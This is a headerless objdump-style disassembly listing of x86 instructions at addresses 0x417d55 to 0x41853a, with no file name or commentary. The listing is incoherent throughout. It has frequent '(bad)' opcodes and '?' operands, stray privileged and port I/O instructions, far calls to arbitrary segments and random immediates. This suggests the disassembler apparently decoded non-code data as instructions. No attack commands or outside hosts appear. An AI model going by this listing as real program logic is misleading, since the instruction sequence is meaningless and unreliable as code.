  417d55:	test   al,0xb1
  417d57:	imul   eax,DWORD PTR [edx+0x44f0be68],0x32
  417d5e:	rcr    BYTE PTR [ebx-0x5f],cl
  417d61:	jns    0x417d5a
  417d63:	mov    cl,0x7e
  417d65:	std    
  417d66:	popa   
  417d67:	xor    ecx,ecx
  417d69:	mov    dx,WORD PTR [ebp+eiz*2-0x5135ea]
  417d71:	jb     0x417d45
  417d73:	xchg   edi,eax
  417d74:	dec    esp
  417d75:	mov    BYTE PTR [eax],bl
  417d77:	hlt    
  417d78:	cmp    eax,0x5b676177
  417d7d:	push   ss
  417d7e:	(bad)  
  417d7f:	xchg   edx,eax
  417d80:	lock fcom DWORD PTR [ebx+0x3afd192d]
  417d87:	into   
  417d88:	fs daa 
  417d8a:	jb     0x417d85
  417d8c:	loope  0x417d54
  417d8e:	cmp    BYTE PTR ds:[edx+0x10382e7],al
  417d95:	dec    ebp
  417d96:	ret    0x91ca
  417d99:	xchg   edi,eax
  417d9a:	jl     0x417d6c
  417d9c:	jp     0x417d5f
  417d9e:	aad    0x17
  417da0:	adc    BYTE PTR [esi],bl
  417da2:	daa    
  417da3:	lds    esi,FWORD PTR [ecx]
  417da5:	sbb    edi,edi
  417da7:	bound  ecx,QWORD PTR [eax]
  417da9:	call   0x680d:0xc880c04f
  417db0:	pop    eax
  417db1:	dec    edx
  417db2:	test   eax,0x2e14fceb
  417db7:	add    eax,0xa6c9a0ed
  417dbc:	int    0xc6
  417dbe:	cmp    DWORD PTR [ebp-0x43],ebx
  417dc1:	ja     0x417d47
  417dc3:	jo     0x417e04
  417dc5:	mov    dl,0x8d
  417dc7:	mov    ch,0xb1
  417dc9:	fidivr WORD PTR [edx+0x237ea2c0]
  417dcf:	xchg   ebx,eax
  417dd0:	lds    edi,FWORD PTR [esi]
  417dd2:	call   0xfc0e:0xd812250f
  417dd9:	fwait
  417dda:	jl     0x417e15
  417ddc:	clc    
  417ddd:	dec    edx
  417dde:	shl    DWORD PTR [eax+ebx*2+0xe5804e8],1
  417de5:	out    0x73,eax
  417de7:	mov    ?,WORD PTR [ebp-0x12e46a80]
  417ded:	push   eax
  417dee:	test   DWORD PTR [ebx+0x68799953],edi
  417df4:	clc    
  417df5:	ins    BYTE PTR es:[edi],dx
  417df6:	test   BYTE PTR [edx+0x1da56424],bl
  417dfc:	mov    dh,0xa2
  417dfe:	pop    edx
  417dff:	ds ja  0x417dfc
  417e02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e03:	out    dx,eax
  417e04:	jge    0x417e77
  417e06:	jb     0x417e5b
  417e08:	mov    dl,0x84
  417e0a:	cmc    
  417e0b:	push   edi
  417e0d:	mov    ecx,0xad871d92
  417e12:	pop    eax
  417e13:	ficomp DWORD PTR [edx+0x1475666a]
  417e19:	inc    esp
  417e1a:	push   eax
  417e1b:	pop    ebp
  417e1c:	push   ebp
  417e1d:	mov    bl,0x48
  417e1f:	icebp  
  417e20:	mov    al,0xec
  417e22:	inc    ebx
  417e23:	push   ss
  417e24:	adc    DWORD PTR [ebp+0x51f26d99],esp
  417e2a:	mov    dh,0x9
  417e2c:	rcr    ecx,cl
  417e2e:	mov    dl,0xe9
  417e30:	and    eax,0x4e7033c7
  417e35:	push   ecx
  417e36:	popf   
  417e37:	push   esp
  417e38:	stos   BYTE PTR es:[edi],al
  417e39:	adc    BYTE PTR [ebp+esi*2+0x6d],ch
  417e3d:	mov    WORD PTR [edi+0x7bc93d0],?
  417e43:	rcr    DWORD PTR [edx-0x6c99891c],0x93
  417e4a:	ja     0x417e24
  417e4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e4d:	shr    DWORD PTR [eax],0x97
  417e50:	xchg   ebp,eax
  417e51:	inc    eax
  417e52:	sti    
  417e53:	fldenv [edx]
  417e55:	shl    BYTE PTR [esi+0x21],0x69
  417e59:	sbb    DWORD PTR [edx-0x58],esp
  417e5c:	mov    bl,0x14
  417e5e:	mov    ebp,0x3373f102
  417e63:	sub    eax,ebp
  417e65:	sub    al,0x11
  417e67:	adc    DWORD PTR [eax+0x67],ebp
  417e6a:	loop   0x417e77
  417e6c:	inc    edx
  417e6d:	adc    DWORD PTR [edi],ebp
  417e6f:	ins    BYTE PTR es:[edi],dx
  417e70:	scas   al,BYTE PTR es:[edi]
  417e71:	mov    ds:0xadeddbba,eax
  417e76:	sub    BYTE PTR [edx-0x488ba588],0x51
  417e7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e7e:	mov    DWORD PTR [edi+0x7e],edi
  417e81:	hlt    
  417e82:	mov    bh,0x71
  417e84:	push   esp
  417e85:	pop    eax
  417e86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e87:	xchg   edi,eax
  417e88:	push   esi
  417e89:	lock jns 0x417e97
  417e8c:	push   0xb2efd1ce
  417e91:	inc    eax
  417e92:	stos   DWORD PTR es:[edi],eax
  417e93:	adc    cl,BYTE PTR [ebx+0x51]
  417e96:	mov    dh,0x52
  417e98:	int3   
  417e99:	mov    ah,0x69
  417e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e9c:	xchg   esp,eax
  417e9d:	mov    edx,0x1f43d74e
  417ea2:	enter  0xc5aa,0x5b
  417ea6:	jnp    0x417e43
  417ea8:	mov    edx,0x661e1717
  417ead:	jp     0x417f1e
  417eaf:	mov    al,ds:0x78fd8324
  417eb4:	mov    ds:0x9ddbb8e7,eax
  417eb9:	mov    eax,DWORD PTR [ebx-0x65]
  417ebc:	jmp    0x417f32
  417ebe:	retf   0x26ab
  417ec1:	ret    0x37f4
  417ec4:	pop    edx
  417ec5:	push   0x692f6038
  417eca:	sbb    edx,esp
  417ecc:	ins    BYTE PTR es:[edi],dx
  417ecd:	pop    edi
  417ece:	js     0x417e5c
  417ed0:	lods   eax,DWORD PTR ds:[esi]
  417ed1:	jp     0x417f0e
  417ed3:	sbb    DWORD PTR [ecx+esi*1+0x5de2d9d4],esp
  417eda:	sbb    dl,dl
  417edc:	sar    BYTE PTR [esi],cl
  417ede:	or     ecx,0x62
  417ee1:	add    eax,DWORD PTR [eax-0x20]
  417ee4:	test   ebp,esi
  417ee6:	xchg   BYTE PTR [edx],bh
  417ee8:	xor    BYTE PTR [eax+0x47],0xbf
  417eec:	adc    eax,0xd828c9c4
  417ef1:	jg     0x417ee6
  417ef3:	dec    eax
  417ef4:	out    0x60,al
  417ef6:	adc    eax,DWORD PTR [ecx+0x5ecccef2]
  417efc:	sar    DWORD PTR [ecx+0x1fa6492c],1
  417f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f03:	ror    BYTE PTR [ecx],0xb4
  417f06:	push   ebx
  417f07:	pop    esi
  417f08:	mov    al,0x1c
  417f0a:	pusha  
  417f0b:	pop    es
  417f0c:	lahf   
  417f0d:	(bad)  
  417f0f:	adc    al,0xf
  417f11:	loopne 0x417ec1
  417f13:	es add bh,al
  417f16:	aam    0xb3
  417f18:	daa    
  417f19:	es pop ds
  417f1b:	fdivr  QWORD PTR [eax+0xb]
  417f1e:	inc    eax
  417f1f:	shl    BYTE PTR [edx],0x7f
  417f22:	xor    eax,0x9760d49b
  417f27:	call   0x8887:0x21cc7ef1
  417f2e:	cmp    DWORD PTR [ecx+0x65],0xa40aca5
  417f35:	sbb    DWORD PTR [edx+0x3f],esi
  417f38:	call   0x4fda:0xb6da977d
  417f3f:	in     al,dx
  417f40:	lahf   
  417f41:	adc    al,0xfc
  417f43:	(bad)  
  417f44:	fsubr  QWORD PTR [ebx-0xb713ba7]
  417f4a:	sub    al,0xf1
  417f4c:	call   0xdba4:0xaf2453ac
  417f53:	bnd call 0xc6ed8d42
  417f59:	cli    
  417f5a:	test   eax,0xe3cf9415
  417f5f:	ins    BYTE PTR es:[edi],dx
  417f60:	add    al,0x49
  417f62:	inc    edx
  417f63:	mov    bh,0x8b
  417f65:	test   al,0x4d
  417f67:	out    dx,eax
  417f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f69:	sar    dh,1
  417f6b:	call   0x7613d8c3
  417f70:	sub    al,BYTE PTR [esi-0x735f484a]
  417f76:	sbb    BYTE PTR [ecx-0x7a],dh
  417f79:	imul   edi,DWORD PTR [edi],0xa50040c5
  417f7f:	and    DWORD PTR [edi],edi
  417f81:	sbb    dl,BYTE PTR [ecx+eiz*8+0x74]
  417f85:	div    ah
  417f87:	dec    eax
  417f88:	imul   ebp,DWORD PTR ds:0xc933f578,0xffffffe3
  417f8f:	imul   DWORD PTR [eax+ebx*8+0x34]
  417f93:	push   ds
  417f94:	scas   al,BYTE PTR es:[edi]
  417f95:	pop    edx
  417f96:	mov    ds:0xba08ff06,al
  417f9b:	retf   0x5fc3
  417f9e:	jbe    0x417f45
  417fa0:	xchg   esi,eax
  417fa1:	dec    eax
  417fa2:	fsubr  QWORD PTR [edi+0x3caa3c24]
  417fa8:	xchg   ecx,eax
  417fa9:	rcl    ebp,1
  417fab:	repz popf 
  417fad:	stc    
  417fae:	sar    DWORD PTR [edi-0x53],1
  417fb1:	mov    esi,0x16ac0cdc
  417fb6:	ins    DWORD PTR es:[edi],dx
  417fb7:	and    ebp,ecx
  417fb9:	addr16 push 0xffffff9e
  417fbc:	inc    edi
  417fbd:	sub    eax,0x29462187
  417fc2:	mov    WORD PTR [eax-0x6],fs
  417fc5:	xchg   BYTE PTR [eax+0x43],cl
  417fc8:	cli    
  417fc9:	xor    al,0x2c
  417fcb:	and    eax,0x5bc14bb2
  417fd0:	test   al,0xe1
  417fd2:	dec    eax
  417fd3:	out    0x9f,al
  417fd5:	pop    eax
  417fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fd7:	fadd   QWORD PTR [ebx+ebx*1-0x23]
  417fdb:	xchg   edx,eax
  417fdc:	mov    edx,0x3405a81d
  417fe1:	dec    esp
  417fe2:	mov    al,BYTE PTR [ecx+0x1fbd3b7]
  417fe8:	mov    eax,DWORD PTR [eax-0x4994f444]
  417fee:	js     0x418034
  417ff0:	mov    bl,0x6b
  417ff2:	xchg   edi,eax
  417ff3:	mov    gs,WORD PTR [ecx+edi*4-0x1c]
  417ff7:	jg     0x417f9a
  417ff9:	cmp    BYTE PTR [eax-0x2c],bl
  417ffc:	jg     0x41805a
  417ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fff:	out    0x59,eax
  418001:	fdivr  QWORD PTR [esi+0x6b]
  418004:	lock adc ecx,esi
  418007:	push   eax
  418008:	js     0x417fd4
  41800a:	sbb    eax,0x19e6c867
  41800f:	xor    dh,ah
  418011:	mov    bl,0xb4
  418013:	xor    eax,0xf353ed8f
  418018:	ret    
  418019:	scas   eax,DWORD PTR es:[edi]
  41801a:	out    0xf1,eax
  41801c:	sbb    edx,DWORD PTR [ecx]
  41801e:	stos   BYTE PTR es:[edi],al
  41801f:	add    BYTE PTR [edi+0x44661756],dh
  418025:	out    dx,al
  418026:	ds push esi
  418028:	(bad)  
  418029:	aad    0x2b
  41802b:	test   DWORD PTR [ecx+edi*1-0x28],ebp
  41802f:	adc    eax,0x761e83d3
  418034:	lods   eax,DWORD PTR ds:[esi]
  418035:	jl     0x418026
  418037:	loope  0x418092
  418039:	inc    ebp
  41803a:	and    DWORD PTR [esi],ebp
  41803c:	mov    ecx,0xa624de0b
  418041:	leavew 
  418043:	gs hlt 
  418045:	push   es
  418046:	inc    edx
  418047:	lds    esp,FWORD PTR [eax]
  418049:	mov    cl,0x39
  41804b:	cli    
  41804c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41804d:	ror    esp,0x8b
  418050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418051:	retf   0x5848
  418054:	or     eax,0xe4906ec2
  418059:	sbb    al,0x37
  41805b:	jne    0x41804e
  41805d:	repnz sbb esp,DWORD PTR [ecx+ebp*8+0x6165a38a]
  418065:	xor    BYTE PTR [esi+ecx*2],dl
  418068:	fcomp  st(2)
  41806a:	and    eax,0x789d65ff
  41806f:	lea    ecx,[edi]
  418071:	pop    es
  418072:	loope  0x41803a
  418074:	dec    esi
  418075:	and    eax,0x30b96e03
  41807a:	or     BYTE PTR [edi+edx*8],ah
  41807d:	dec    eax
  41807e:	call   0x8392:0xf1d19939
  418085:	das    
  418086:	and    esp,DWORD PTR [ecx+0x758e3c44]
  41808c:	cli    
  41808d:	out    dx,al
  41808e:	ret    0x783a
  418091:	xlat   BYTE PTR ds:[ebx]
  418092:	mov    ah,0x56
  418094:	outs   dx,BYTE PTR ds:[esi]
  418095:	(bad)  
  418096:	cmc    
  418097:	test   eax,0x6706e8b3
  41809c:	sti    
  41809d:	in     eax,0xc0
  41809f:	or     ch,bl
  4180a1:	icebp  
  4180a2:	sbb    eax,0x865be24c
  4180a7:	or     DWORD PTR [ecx+edi*2],esp
  4180aa:	idiv   BYTE PTR [edi]
  4180ac:	bound  edx,QWORD PTR [ebx]
  4180ae:	mov    ds:0xa74fbeff,eax
  4180b3:	fwait
  4180b4:	rcr    DWORD PTR es:[ebx+0x68],0x8
  4180b9:	mov    ds:0x1a0bfae2,al
  4180be:	sub    ebp,DWORD PTR [edi]
  4180c0:	adc    ecx,DWORD PTR [edx+0x71]
  4180c3:	sbb    eax,0x53333331
  4180c8:	pop    ecx
  4180c9:	add    esi,DWORD PTR [ebx]
  4180cb:	popa   
  4180cc:	rcl    DWORD PTR [edi+ebx*8+0xc],cl
  4180d0:	and    ebp,DWORD PTR [eax]
  4180d2:	cmp    al,BYTE PTR [ebp-0x7d]
  4180d5:	xchg   di,ax
  4180d7:	pop    edi
  4180d8:	in     al,dx
  4180d9:	jge    0x41808a
  4180db:	mov    esi,0xf49407d1
  4180e0:	or     ebx,eax
  4180e2:	jl     0x418140
  4180e4:	inc    ebp
  4180e5:	push   ds
  4180e6:	ret    
  4180e7:	lock lods al,BYTE PTR cs:[esi]
  4180ea:	dec    edx
  4180eb:	in     eax,dx
  4180ec:	or     BYTE PTR [edx-0x2b05c627],bl
  4180f2:	(bad)  
  4180f3:	mov    BYTE PTR [ebp-0x1c],cl
  4180f6:	inc    eax
  4180f7:	mov    ch,BYTE PTR [esi]
  4180f9:	mov    esp,0x52fba7b5
  4180fe:	mov    dl,bl
  418100:	mov    ebx,0xcab4b048
  418105:	inc    edx
  418106:	rol    BYTE PTR [ebp+0x5cce4417],cl
  41810c:	lds    edx,FWORD PTR [edx-0x4d]
  41810f:	clc    
  418110:	mov    edi,0x1e0604ea
  418115:	adc    ebp,DWORD PTR [esi+ecx*1-0x604802ac]
  41811c:	push   ebx
  41811d:	and    ah,BYTE PTR [esi]
  41811f:	stos   DWORD PTR es:[edi],eax
  418120:	push   ss
  418121:	fld    QWORD PTR [eax+0xd8a11b1]
  418127:	fistp  QWORD PTR [edi]
  418129:	xchg   DWORD PTR [ebx],esp
  41812b:	jle    0x41810c
  41812d:	stos   BYTE PTR es:[edi],al
  41812e:	mov    ecx,0x5e3f9184
  418133:	xor    BYTE PTR [eax-0x2d6096eb],ah
  418139:	xor    ecx,edx
  41813b:	sub    DWORD PTR [ecx],ebp
  41813d:	pop    ecx
  41813e:	jne    0x418169
  418140:	mov    fs,WORD PTR [eax-0x78]
  418143:	sub    DWORD PTR [ecx+0x79],edx
  418146:	add    eax,0x3b30dc9
  41814b:	jns    0x418111
  41814d:	imul   esi,ebx,0xffffffc8
  418150:	inc    ecx
  418151:	or     DWORD PTR [ebp-0x71],edx
  418154:	mov    ah,ch
  418156:	xchg   edx,eax
  418157:	jo     0x418162
  418159:	aaa    
  41815a:	in     eax,0x55
  41815c:	push   ds
  41815d:	je     0x4180f7
  41815f:	dec    ebx
  418160:	cld    
  418161:	cmp    bh,BYTE PTR [ecx+0x2e]
  418164:	cmp    BYTE PTR [edx],ah
  418166:	mov    cl,BYTE PTR [eax-0x2b250401]
  41816c:	dec    esp
  41816d:	mov    eax,0xbe757cd6
  418172:	out    dx,eax
  418173:	fsub   st,st(1)
  418175:	push   ebp
  418176:	aad    0x12
  418178:	inc    edx
  418179:	or     DWORD PTR [esi+0x4eb7e35b],ecx
  41817f:	out    0x11,al
  418181:	not    DWORD PTR [eax-0x16]
  418184:	mov    edi,DWORD PTR [edx+eax*2+0x6cc79ec]
  41818b:	in     eax,dx
  41818c:	prefetcht1 BYTE PTR [edx]
  41818f:	inc    BYTE PTR [esp+eax*8+0x55]
  418193:	std    
  418194:	mov    ?,WORD PTR [edi-0x2b230627]
  41819a:	push   0xdb10389c
  41819f:	cmp    eax,DWORD PTR cs:[esi-0x33]
  4181a3:	sub    DWORD PTR [edx+0x75],edi
  4181a6:	mov    cl,0x39
  4181a8:	jmp    0x54c8:0xaee40571
  4181af:	dec    esi
  4181b0:	lods   al,BYTE PTR ds:[esi]
  4181b1:	inc    esi
  4181b2:	test   al,cl
  4181b4:	pop    ebp
  4181b5:	mov    ?,esi
  4181b7:	rol    BYTE PTR [esi-0x65c68d7f],cl
  4181bd:	adc    eax,0x507c9617
  4181c2:	or     ebp,DWORD PTR [ebp+0x4a]
  4181c5:	mov    al,0xda
  4181c7:	pop    es
  4181c8:	mov    ebp,0x2899990a
  4181cd:	test   eax,0xfc4313d4
  4181d2:	popa   
  4181d3:	retf   
  4181d4:	jns    0x4181e0
  4181d6:	push   edx
  4181d7:	cmp    DWORD PTR [ebp+0x6f],esi
  4181da:	(bad)  
  4181db:	fadd   QWORD PTR [esi]
  4181dd:	lea    ecx,[ebx-0xd791278]
  4181e3:	scas   eax,DWORD PTR es:[edi]
  4181e4:	sub    BYTE PTR ds:0x6753408a,cl
  4181ea:	mov    bl,0x24
  4181ec:	xchg   ebp,eax
  4181ed:	ins    BYTE PTR es:[edi],dx
  4181ee:	loope  0x418235
  4181f0:	jae    0x418257
  4181f2:	neg    DWORD PTR [edi+0x7bc05a46]
  4181f8:	int    0x84
  4181fa:	xor    eax,0x53cbac10
  4181ff:	test   al,bh
  418201:	addr16 pop ecx
  418203:	or     BYTE PTR [edx+0x81e2853],dl
  418209:	loope  0x4181a6
  41820b:	fsqrt  
  41820d:	fadd   QWORD PTR [ebx-0x58]
  418210:	das    
  418211:	dec    eax
  418212:	imul   esp,edx,0x15aa366a
  418218:	push   ecx
  418219:	call   0xd978:0x3f3e5e23
  418220:	adc    al,0x7
  418222:	inc    eax
  418223:	imul   ebx,DWORD PTR [edx],0xffffffe9
  418226:	push   0x2
  418228:	adc    eax,0xc7d25f21
  41822d:	xor    al,0x7d
  41822f:	lods   eax,DWORD PTR ds:[esi]
  418230:	cld    
  418231:	jb     0x4182b2
  418233:	lock (bad) 
  418235:	cmp    eax,0xc877bb3a
  41823a:	or     DWORD PTR [edi+0x0],esi
  41823d:	sub    dl,dl
  41823f:	mov    ds:0x3aa69b99,al
  418244:	cld    
  418245:	jle    0x4182b7
  418247:	sti    
  418248:	mov    WORD PTR [edi],fs
  41824a:	push   ds
  41824b:	cs inc ebp
  41824d:	xlat   BYTE PTR ds:[ebx]
  41824e:	add    bl,BYTE PTR [eax]
  418250:	or     al,0x59
  418252:	xchg   ebp,eax
  418253:	add    eax,0x2022b18b
  418258:	add    al,0x9b
  41825a:	xchg   ebp,eax
  41825b:	dec    eax
  41825c:	lea    ebx,[edi+0x7e5531ae]
  418262:	adc    DWORD PTR [ecx],eax
  418264:	std    
  418265:	daa    
  418266:	imul   ebx,DWORD PTR [ebp-0x2291e1fb],0x49069182
  418270:	lods   al,BYTE PTR ds:[esi]
  418271:	cmp    dh,0xe6
  418274:	xchg   esi,eax
  418275:	jle    0x4182ce
  418277:	and    bh,BYTE PTR [edx-0x37]
  41827a:	out    0x4b,al
  41827c:	add    ah,bh
  41827e:	sbb    bh,al
  418280:	dec    edi
  418281:	out    dx,eax
  418282:	loope  0x4182ec
  418284:	loope  0x418264
  418286:	add    cl,bh
  418288:	inc    esi
  418289:	adc    al,BYTE PTR gs:[esi]
  41828c:	mov    esi,0x1d493def
  418291:	mov    ds:0x208f9960,al
  418296:	dec    ebx
  418297:	inc    eax
  418298:	ds call 0x74e3e241
  41829e:	cmc    
  41829f:	into   
  4182a0:	popa   
  4182a1:	or     BYTE PTR [esp+ebx*1-0x6b],ah
  4182a5:	es out dx,eax
  4182a7:	sbb    al,0x33
  4182a9:	mov    ds:0x7a3a9927,eax
  4182ae:	rcl    edx,1
  4182b0:	adc    eax,0x7a0a7318
  4182b5:	jp     0x4182af
  4182b7:	mov    dl,0x6d
  4182b9:	dec    edx
  4182ba:	xor    ah,bh
  4182bc:	popa   
  4182bd:	lock (bad) 
  4182bf:	imul   edx,DWORD PTR [edx-0x61db45f1],0x4b0656c5
  4182c9:	xor    edi,ebx
  4182cb:	inc    esi
  4182cc:	push   0x1384f608
  4182d1:	dec    edx
  4182d2:	jmp    0xc1594b
  4182d7:	cld    
  4182d8:	mov    ebx,0x68ecfcfb
  4182dd:	aaa    
  4182de:	inc    ebx
  4182df:	push   eax
  4182e0:	cld    
  4182e1:	add    DWORD PTR [ebx],eax
  4182e3:	sub    esi,edi
  4182e5:	pop    ebp
  4182e6:	loope  0x418306
  4182e8:	jmp    0x418324
  4182ea:	mov    DWORD PTR [edx+0x7],edx
  4182ed:	icebp  
  4182ee:	xchg   esp,eax
  4182ef:	cmp    BYTE PTR [eax+0x22a632d],0x74
  4182f6:	fadd   QWORD PTR [edx-0x48]
  4182f9:	mov    cl,0x6d
  4182fb:	push   ebx
  4182fc:	jmp    0x1afd5989
  418301:	cmp    edi,DWORD PTR [ecx]
  418303:	pop    esi
  418304:	leave  
  418305:	jp     0x418342
  418307:	jmp    0x9e244a89
  41830c:	dec    esi
  41830d:	mov    dh,0x16
  41830f:	xor    ch,bh
  418311:	push   esp
  418312:	pop    esp
  418313:	leave  
  418314:	ss cdq 
  418316:	hlt    
  418317:	adc    BYTE PTR [esi+esi*8],bl
  41831a:	pop    es
  41831b:	scas   eax,DWORD PTR es:[edi]
  41831c:	cli    
  41831d:	sbb    DWORD PTR [edi-0xf699551],esi
  418323:	inc    edi
  418324:	in     al,dx
  418325:	jns    0x418328
  418327:	add    DWORD PTR [ebp+esi*4-0x69],ecx
  41832b:	cmp    dl,0x62
  41832e:	es jns 0x418343
  418331:	out    0x19,al
  418333:	into   
  418334:	vmaxpd xmm6,xmm6,XMMWORD PTR [ebx]
  418338:	jns    0x418384
  41833a:	fcmove st,st(1)
  41833c:	nop
  41833d:	lods   eax,DWORD PTR ds:[esi]
  41833e:	popf   
  41833f:	seto   BYTE PTR [ebx-0x6f]
  418343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418344:	or     DWORD PTR [ebp+0x6a8aedba],ebp
  41834a:	mov    dl,0xe2
  41834c:	pusha  
  41834d:	xchg   ebx,eax
  41834e:	dec    esi
  41834f:	xor    al,0x9b
  418351:	inc    edi
  418352:	fwait
  418353:	aaa    
  418354:	or     eax,0x205a9bee
  418359:	mov    edx,0x57fda0f7
  41835e:	int3   
  41835f:	mov    DWORD PTR [ecx-0x4229e2f3],ecx
  418365:	mov    ecx,edx
  418367:	xchg   esi,eax
  418368:	mov    WORD PTR [ebx-0x4],fs
  41836b:	out    dx,al
  41836c:	push   cs
  41836d:	std    
  41836e:	adc    DWORD PTR [eax+0x2cd3ddc1],edx
  418374:	sub    eax,0xc9572040
  418379:	sbb    ch,0x52
  41837c:	iret   
  41837d:	xor    esi,edi
  41837f:	imul   ebp,DWORD PTR [ebp-0x17],0x235df572
  418386:	hlt    
  418387:	push   eax
  418388:	jno    0x418354
  41838a:	jp     0x4183a5
  41838c:	test   eax,0x511373af
  418391:	cmp    eax,0xc134bab0
  418396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418397:	aaa    
  418398:	pop    ebx
  418399:	lgs    esp,FWORD PTR [ebp+ecx*2+0x406b6c61]
  4183a1:	sbb    bh,0xaa
  4183a4:	ret    0xfcf6
  4183a7:	push   esi
  4183a8:	push   cs
  4183a9:	test   BYTE PTR [ebx-0x32],bh
  4183ac:	cmp    bl,dh
  4183ae:	jmp    0x41834d
  4183b0:	stos   BYTE PTR es:[edi],al
  4183b1:	(bad)  
  4183b2:	inc    BYTE PTR [edx-0x34e57ccb]
  4183b8:	out    dx,eax
  4183b9:	into   
  4183ba:	mov    esi,0x2b9b6717
  4183bf:	imul   edx,DWORD PTR [edi+ebx*4],0xffffffb5
  4183c3:	lahf   
  4183c4:	adc    DWORD PTR [ebp-0x1c],esp
  4183c7:	mov    esp,0x92c7d49d
  4183cc:	loope  0x418390
  4183ce:	loop   0x4183f6
  4183d0:	xchg   DWORD PTR [eax-0x2b],eax
  4183d3:	seto   BYTE PTR [esi+ebp*2]
  4183d7:	aas    
  4183d8:	mov    eax,esi
  4183da:	sti    
  4183db:	sub    al,0xf0
  4183dd:	add    dh,al
  4183df:	shr    DWORD PTR [edx+0x56],cl
  4183e2:	cmp    al,0xc7
  4183e4:	nop
  4183e5:	mov    ecx,0x985e3c19
  4183ea:	add    bl,al
  4183ec:	jmp    0x418389
  4183ee:	neg    DWORD PTR [eax]
  4183f0:	mov    ds:0x7c2191ee,eax
  4183f5:	adc    bl,bl
  4183f7:	jo     0x4183fa
  4183f9:	cld    
  4183fa:	dec    ebx
  4183fb:	std    
  4183fc:	lds    esp,FWORD PTR [esp+edx*2+0x69]
  418400:	fcom   st(1)
  418402:	gs jns 0x4183c0
  418405:	and    DWORD PTR [edx+0x4d],ebx
  418408:	scas   eax,DWORD PTR es:[edi]
  418409:	mov    ebx,0x871c31f4
  41840e:	mov    bh,0xbb
  418410:	xor    al,0xb4
  418412:	ja     0x4183b6
  418414:	xchg   ebx,eax
  418415:	jb     0x4183f0
  418417:	pop    ebp
  418418:	lock bound ebx,QWORD PTR ds:0xbce058ca
  41841f:	in     al,dx
  418420:	gs ds ret 
  418423:	sbb    DWORD PTR [ecx+0x24],edx
  418426:	outs   dx,DWORD PTR ds:[esi]
  418427:	xchg   esp,eax
  418428:	ffree  st(3)
  41842a:	call   0x9123:0x45da7b46
  418431:	aad    0xda
  418433:	mov    dl,0x63
  418435:	mov    ecx,0xb6d7a28
  41843a:	aam    0x7
  41843c:	idiv   esp
  41843e:	xor    edi,edx
  418440:	adc    DWORD PTR [edi],edx
  418442:	mov    cs,WORD PTR ds:0xc7af3435
  418448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418449:	rol    ch,cl
  41844b:	test   DWORD PTR [ecx+0x1143a402],0x1b2ca6e6
  418455:	or     ebx,DWORD PTR [esi+0x48d715d8]
  41845b:	fisttp WORD PTR [edi+0x60]
  41845e:	sahf   
  41845f:	outs   dx,BYTE PTR ds:[esi]
  418460:	inc    edx
  418461:	jle    0x4183e8
  418463:	stos   DWORD PTR es:[edi],eax
  418464:	gs ja  0x418409
  418467:	dec    ebx
  418468:	jmp    0x6677844a
  41846d:	sbb    ch,BYTE PTR [ebp-0x3de54a8b]
  418473:	(bad)  
  418475:	enter  0x5bda,0x2e
  418479:	and    DWORD PTR [ebx-0x21],0xe007857e
  418480:	das    
  418481:	fsub   DWORD PTR [edi+0x54]
  418484:	repnz in al,dx
  418486:	mov    cs,ebx
  418488:	adc    ecx,esi
  41848a:	arpl   WORD PTR [eax-0x2831a776],di
  418490:	xor    ebp,0xf5ac66d5
  418496:	arpl   ax,bp
  418498:	push   esi
  418499:	adc    bh,BYTE PTR [esi]
  41849b:	shl    DWORD PTR [edx-0xf2f1f3d],1
  4184a1:	enter  0x8470,0x56
  4184a5:	and    eax,0xc427a1fa
  4184aa:	mov    eax,ds:0xd29e65e8
  4184af:	cmp    bh,cl
  4184b1:	sub    eax,0x7ac82950
  4184b6:	jo     0x418489
  4184b8:	gs jg  0x4184a7
  4184bb:	dec    ebx
  4184bc:	push   edx
  4184bd:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4184bf:	mov    eax,0xea2223b0
  4184c4:	fild   QWORD PTR [eax-0x21d83693]
  4184ca:	sub    ah,bh
  4184cc:	leave  
  4184cd:	cmp    al,0xc5
  4184cf:	dec    ebx
  4184d0:	dec    ebx
  4184d1:	mov    ?,eax
  4184d3:	push   eax
  4184d4:	loopne 0x418543
  4184d6:	stos   BYTE PTR es:[edi],al
  4184d7:	mov    dh,0x83
  4184d9:	inc    esp
  4184da:	popa   
  4184db:	lock inc esp
  4184dd:	pop    ds
  4184de:	mov    esp,0xcaecd10a
  4184e3:	mov    ds,WORD PTR [edi]
  4184e5:	pop    edx
  4184e6:	inc    eax
  4184e7:	pop    es
  4184e8:	mov    al,0xfc
  4184ea:	add    eax,0xf9a0e2d4
  4184ef:	and    bl,ah
  4184f1:	mov    DWORD PTR [edx-0x25],eax
  4184f4:	lods   al,BYTE PTR ds:[esi]
  4184f5:	call   0x2be1:0xd8d7f960
  4184fc:	jmp    0x4184ca
  4184fe:	stc    
  4184ff:	test   eax,0x34870009
  418504:	sar    BYTE PTR [ecx+0x43],0x6a
  418508:	je     0x418532
  41850a:	cmp    al,0x3b
  41850c:	jmp    0x418562
  41850e:	mov    fs,WORD PTR [ebx+ebx*4+0x328a0dbb]
  418515:	and    BYTE PTR [esi+0x5e421cbe],0xb1
  41851c:	ss (bad) 
  41851e:	push   eax
  41851f:	mov    dl,0xce
  418521:	xor    DWORD PTR [edx],ebp
  418523:	call   0x52b8:0x3e5886c7
  41852a:	in     eax,0xce
  41852c:	sbb    DWORD PTR [edi],ebp
  41852e:	jmp    0x418553
  418530:	mov    al,0xcf
  418532:	ins    BYTE PTR es:[edi],dx
  418533:	push   ebx
  418534:	je     0x4184f0
  418536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418537:	mov    DWORD PTR [edx-0x1f],esi
  41853a:	xor    BYTE PTR ds:0x7820e8de,dh
